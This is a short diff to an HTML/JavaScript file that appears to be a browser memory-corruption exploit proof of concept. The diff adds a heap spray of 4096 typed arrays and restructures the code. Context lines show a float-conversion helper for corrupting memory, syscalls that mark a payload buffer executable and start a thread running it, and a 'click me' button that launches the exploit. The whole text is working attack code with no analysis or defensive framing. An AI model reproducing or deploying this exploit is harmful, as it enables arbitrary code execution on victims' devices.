@@ -68,8 +68,22 @@ return retv;
 };
 return this;
 };
-
-var _dview;function u2d(low,hi){
+  func1();
+function makeid(){
+var text="";
+var possible="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+for(var i=0;i<8;i++){
+text+=possible.charAt(Math.floor(Math.random()*possible.length));
+};return text;
+};
+var instancespr=[];
+for(var i=0;i<4096;i++){
+instancespr[i]=new Uint32Array(1);
+instancespr[i][makeid()]=50057;
+};
+function func1(){
+  var _dview;
+  function u2d(low,hi){
 if(!_dview)_dview=new DataView(new ArrayBuffer(16));
 _dview.setUint32(0,hi);_dview.setUint32(4,low);
 return _dview.getFloat64(0);
@@ -692,5 +706,5 @@ payloadbuf.backing[i]=payload[i];
 };
 p.syscall(74,payloadbuf,65536,7);
 p.syscall(324,1);p.fcall(createThread,payloadbuf,0,p.sptr("payload"));
-done();
+done();};
 }}</script><button onclick="try{poc()}catch(e){alert(e);}">click me</button>
